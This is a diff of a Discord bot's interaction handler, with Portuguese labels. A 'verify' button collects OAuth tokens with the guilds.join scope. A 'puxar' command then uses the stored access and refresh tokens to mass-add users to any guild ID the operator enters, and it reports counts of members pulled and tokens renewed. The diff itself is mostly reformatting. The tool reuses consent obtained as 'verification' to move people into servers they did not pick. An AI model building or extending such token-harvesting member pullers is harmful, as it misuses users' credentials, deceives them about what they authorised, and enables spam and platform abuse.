@@ -2,9 +2,6 @@ const { ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBui
 const { users, config } = require('../database');
 const axios = require('axios');
 
-// ============================
-// REFRESH TOKEN
-// ============================
 async function refreshAccessToken(refreshToken) {
     try {
         const params = new URLSearchParams();
@@ -20,21 +17,15 @@ async function refreshAccessToken(refreshToken) {
     }
 }
 
-// ============================
-// PULL WITH REFRESH
-// ============================
 async function pullWithRefresh(guildId, userId, accessToken, refreshToken, userData) {
     let resp = await axios.put(
         `https://discord.com/api/v10/guilds/${guildId}/members/${userId}`,
         { access_token: accessToken },
         { headers: { Authorization: `Bot ${process.env.TOKEN}`, 'Content-Type': 'application/json' }, validateStatus: false }
     );
-
     if (resp.status === 201 || resp.status === 204) return { status: resp.status, refreshed: false };
-
     const errCode = resp.data?.code;
     const isInvalidToken = errCode === 50025 || resp.data?.message?.includes('Invalid OAuth2 access token');
-
     if (isInvalidToken && refreshToken) {
         console.log(`🔄 [REFRESH] token expirado para ${userId}`);
         const newTokens = await refreshAccessToken(refreshToken);
@@ -54,160 +45,128 @@ async function pullWithRefresh(guildId, userId, accessToken, refreshToken, userD
     return { status: resp.status, refreshed: false, data: resp.data };
 }
 
-// ============================
-// MÓDULO PRINCIPAL
-// ============================
 module.exports = {
     async handleInteraction(interaction, client) {
         try {
+            if (interaction.isButton()) {
+                if (interaction.customId.startsWith('sorteio_')) return;
+                if (interaction.customId.startsWith('gift_')) return;
 
-        // ============================
-        // BOTÕES
-        // ============================
-        if (interaction.isButton()) {
-            if (interaction.customId.startsWith('sorteio_')) return;
-            if (interaction.customId.startsWith('gift_')) return;
-
-            if (interaction.customId === 'verify_button') {
-                const clientId = process.env.CLIENT_ID;
-                const redirectUri = encodeURIComponent(process.env.REDIRECT_URI);
-                const scopes = encodeURIComponent('identify email guilds.join offline_access');
-                const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=${scopes}&prompt=consent`;
-                const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Clique aqui para verificar').setEmoji('1470325466828374077').setStyle(ButtonStyle.Link).setURL(oauthUrl));
-                await interaction.reply({ components: [row], flags: 64 });
-            }
-            else if (interaction.customId === 'config_role') {
-                const modal = new ModalBuilder().setCustomId('modal_role').setTitle('Configurar Cargo');
-                const input = new TextInputBuilder().setCustomId('role_id').setLabel('ID do Cargo').setStyle(TextInputStyle.Short).setRequired(true);
-                modal.addComponents(new ActionRowBuilder().addComponents(input));
-                await interaction.showModal(modal);
-            }
-            else if (interaction.customId === 'config_logs') {
-                const modal = new ModalBuilder().setCustomId('modal_logs').setTitle('Configurar Logs');
-                const input = new TextInputBuilder().setCustomId('log_id').setLabel('ID do Canal de Logs').setStyle(TextInputStyle.Short).setRequired(true);
-                modal.addComponents(new ActionRowBuilder().addComponents(input));
-                await interaction.showModal(modal);
-            }
-            else if (interaction.customId === 'config_gift_logs') {
-                const modal = new ModalBuilder().setCustomId('modal_gift_logs').setTitle('Configurar Logs de Gift');
-                const input = new TextInputBuilder().setCustomId('gift_log_id').setLabel('ID do Canal de Logs de Gift').setStyle(TextInputStyle.Short).setRequired(true);
-                modal.addComponents(new ActionRowBuilder().addComponents(input));
-                await interaction.showModal(modal);
-            }
-            else if (interaction.customId === 'config_puxar') {
-                try {
-                    const command = client.commands.get('puxar');
-                    if (command) await command.execute(interaction, client);
-                } catch (err) {
-                    console.error('❌ Erro no config_puxar:', err.message);
+                if (interaction.customId === 'verify_button') {
+                    const clientId = process.env.CLIENT_ID;
+                    const redirectUri = encodeURIComponent(process.env.REDIRECT_URI);
+                    const scopes = encodeURIComponent('identify email guilds.join');
+                    const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=${scopes}&prompt=consent`;
+                    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Clique aqui para verificar').setEmoji('1470325466828374077').setStyle(ButtonStyle.Link).setURL(oauthUrl));
+                    await interaction.reply({ components: [row], flags: 64 });
+                }
+                else if (interaction.customId === 'config_role') {
+                    const modal = new ModalBuilder().setCustomId('modal_role').setTitle('Configurar Cargo');
+                    const input = new TextInputBuilder().setCustomId('role_id').setLabel('ID do Cargo').setStyle(TextInputStyle.Short).setRequired(true);
+                    modal.addComponents(new ActionRowBuilder().addComponents(input));
+                    await interaction.showModal(modal);
+                }
+                else if (interaction.customId === 'config_logs') {
+                    const modal = new ModalBuilder().setCustomId('modal_logs').setTitle('Configurar Logs');
+                    const input = new TextInputBuilder().setCustomId('log_id').setLabel('ID do Canal de Logs').setStyle(TextInputStyle.Short).setRequired(true);
+                    modal.addComponents(new ActionRowBuilder().addComponents(input));
+                    await interaction.showModal(modal);
+                }
+                else if (interaction.customId === 'config_gift_logs') {
+                    const modal = new ModalBuilder().setCustomId('modal_gift_logs').setTitle('Configurar Logs de Gift');
+                    const input = new TextInputBuilder().setCustomId('gift_log_id').setLabel('ID do Canal de Logs de Gift').setStyle(TextInputStyle.Short).setRequired(true);
+                    modal.addComponents(new ActionRowBuilder().addComponents(input));
+                    await interaction.showModal(modal);
+                }
+                else if (interaction.customId === 'config_puxar') {
                     try {
-                        if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
-                            await interaction.reply({ content: '❌ Erro ao abrir o formulário.', flags: 64 });
-                        }
-                    } catch (e) {}
-                }
-            }
-        }
-
-        // ============================
-        // MODAIS
-        // ============================
-        else if (interaction.isModalSubmit()) {
-            if (interaction.customId.startsWith('sorteio_modal')) return;
-            if (interaction.customId === 'gift_modal') return;
-
-            if (interaction.customId === 'modal_role') {
-                const roleId = interaction.fields.getTextInputValue('role_id');
-                await config.set('roleId', roleId);
-                await interaction.reply({ content: `✅ Cargo atualizado para <@&${roleId}>`, flags: 64 });
-            }
-            else if (interaction.customId === 'modal_logs') {
-                const logId = interaction.fields.getTextInputValue('log_id');
-                await config.set('logChannelId', logId);
-                await interaction.reply({ content: `✅ Canal de logs atualizado para <#${logId}>`, flags: 64 });
-            }
-            else if (interaction.customId === 'modal_gift_logs') {
-                const giftLogId = interaction.fields.getTextInputValue('gift_log_id');
-                await config.set('giftLogChannelId', giftLogId);
-                await interaction.reply({ content: `🎁 Canal de logs de gift atualizado para <#${giftLogId}>`, flags: 64 });
-            }
-            else if (interaction.customId === 'puxar_modal') {
-                const amount = parseInt(interaction.fields.getTextInputValue('amount'));
-                const targetGuildId = interaction.fields.getTextInputValue('target_guild');
-
-                // ✅ DEFER ANTES DE COMEÇAR (ganha 15 min de tempo)
-                try {
-                    await interaction.deferReply({ flags: 64 });
-                } catch (e) {
-                    console.error('Erro no deferReply:', e.message);
-                    return;
-                }
-
-                const dbData = await users.all();
-                let userList = [];
-
-                if (Array.isArray(dbData)) {
-                    userList = dbData.map(item => {
-                        if (item.ID && item.data) return { id: item.ID, ...item.data };
-                        return item;
-                    });
-                } else if (typeof dbData === 'object' && dbData !== null) {
-                    userList = Object.keys(dbData).map(key => ({ id: key, ...dbData[key] }));
-                }
-
-                const toPull = userList.slice(0, amount);
-
-                // ✅ USA editReply em vez de reply
-                await interaction.editReply({
-                    content: `Powered by **[hyo](https://discord.com/users/1447028236050759700)**\n## -# Progresso: 0/${toPull.length}\n## -# Puxados: 0\n## -# Já estão: 0\n## -# Falhas: 0`
-                });
-
-                let pulled = 0, alreadyIn = 0, failed = 0, processed = 0, refreshedCount = 0;
-
-                for (const userData of toPull) {
-                    const userId = userData.id;
-                    const accessToken = userData.access_token;
-                    const refreshToken = userData.refresh_token;
-
-                    if (!accessToken || !userId || userId === "0") {
-                        failed++;
-                        processed++;
-                        continue;
-                    }
-
-                    try {
-                        const result = await pullWithRefresh(targetGuildId, userId, accessToken, refreshToken, userData);
-                        if (result.refreshed) refreshedCount++;
-                        if (result.status === 201) pulled++;
-                        else if (result.status === 204) alreadyIn++;
-                        else failed++;
+                        const command = client.commands.get('puxar');
+                        if (command) await command.execute(interaction, client);
                     } catch (err) {
-                        failed++;
-                    }
-                    processed++;
-
-                    if (processed % 5 === 0 || processed === toPull.length) {
+                        console.error('❌ Erro no config_puxar:', err.message);
                         try {
-                            await interaction.editReply({
-                                content: `Powered by **[hyo](https://discord.com/users/1447028236050759700)**\n## -# Progresso: ${processed}/${toPull.length}\n## -# Puxados: ${pulled}\n## -# Já estão: ${alreadyIn}\n## -# Falhas: ${failed}`
-                            });
+                            if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
+                                await interaction.reply({ content: '❌ Erro ao abrir o formulário.', flags: 64 });
+                            }
                         } catch (e) {}
                     }
                 }
-
-                try {
-                    await interaction.editReply({
-                        content: `# Ação completa!\n## -# Membros puxados: ${pulled}\n## -# Já estavam no servidor: ${alreadyIn}\n## -# Falhas: ${failed}\n## -# Tokens renovados: ${refreshedCount}`
-                    });
-                } catch (e) {}
             }
-        }
+            else if (interaction.isModalSubmit()) {
+                if (interaction.customId.startsWith('sorteio_modal')) return;
+                if (interaction.customId === 'gift_modal') return;
 
+                if (interaction.customId === 'modal_role') {
+                    const roleId = interaction.fields.getTextInputValue('role_id');
+                    await config.set('roleId', roleId);
+                    await interaction.reply({ content: `✅ Cargo atualizado para <@&${roleId}>`, flags: 64 });
+                }
+                else if (interaction.customId === 'modal_logs') {
+                    const logId = interaction.fields.getTextInputValue('log_id');
+                    await config.set('logChannelId', logId);
+                    await interaction.reply({ content: `✅ Canal de logs atualizado para <#${logId}>`, flags: 64 });
+                }
+                else if (interaction.customId === 'modal_gift_logs') {
+                    const giftLogId = interaction.fields.getTextInputValue('gift_log_id');
+                    await config.set('giftLogChannelId', giftLogId);
+                    await interaction.reply({ content: `🎁 Canal de logs de gift atualizado para <#${giftLogId}>`, flags: 64 });
+                }
+                else if (interaction.customId === 'puxar_modal') {
+                    const amount = parseInt(interaction.fields.getTextInputValue('amount'));
+                    const targetGuildId = interaction.fields.getTextInputValue('target_guild');
+
+                    try { await interaction.deferReply({ flags: 64 }); } catch (e) { return; }
+
+                    const dbData = await users.all();
+                    let userList = [];
+                    if (Array.isArray(dbData)) {
+                        userList = dbData.map(item => { if (item.ID && item.data) return { id: item.ID, ...item.data }; return item; });
+                    } else if (typeof dbData === 'object' && dbData !== null) {
+                        userList = Object.keys(dbData).map(key => ({ id: key, ...dbData[key] }));
+                    }
+
+                    const toPull = userList.slice(0, amount);
+
+                    await interaction.editReply({
+                        content: `Powered by **[hyo](https://discord.com/users/1447028236050759700)**\n## -# Progresso: 0/${toPull.length}\n## -# Puxados: 0\n## -# Já estão: 0\n## -# Falhas: 0`
+                    });
+
+                    let pulled = 0, alreadyIn = 0, failed = 0, processed = 0, refreshedCount = 0;
+
+                    for (const userData of toPull) {
+                        const userId = userData.id;
+                        const accessToken = userData.access_token;
+                        const refreshToken = userData.refresh_token;
+                        if (!accessToken || !userId || userId === "0") { failed++; processed++; continue; }
+                        try {
+                            const result = await pullWithRefresh(targetGuildId, userId, accessToken, refreshToken, userData);
+                            if (result.refreshed) refreshedCount++;
+                            if (result.status === 201) pulled++;
+                            else if (result.status === 204) alreadyIn++;
+                            else failed++;
+                        } catch (err) { failed++; }
+                        processed++;
+                        if (processed % 5 === 0 || processed === toPull.length) {
+                            try {
+                                await interaction.editReply({
+                                    content: `Powered by **[hyo](https://discord.com/users/1447028236050759700)**\n## -# Progresso: ${processed}/${toPull.length}\n## -# Puxados: ${pulled}\n## -# Já estão: ${alreadyIn}\n## -# Falhas: ${failed}`
+                                });
+                            } catch (e) {}
+                        }
+                    }
+
+                    try {
+                        await interaction.editReply({
+                            content: `# Ação completa!\n## -# Membros puxados: ${pulled}\n## -# Já estavam no servidor: ${alreadyIn}\n## -# Falhas: ${failed}\n## -# Tokens renovados: ${refreshedCount}`
+                        });
+                    } catch (e) {}
+                }
+            }
         } catch (err) {
             console.error('❌ Erro no handleInteraction:', err.message);
             try {
                 if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
-                    await interaction.reply({ content: '❌ Ocorreu um erro ao processar.', flags: 64 });
+                    await interaction.reply({ content: '❌ Ocorreu um erro.', flags: 64 });
                 }
             } catch (e) {}
         }
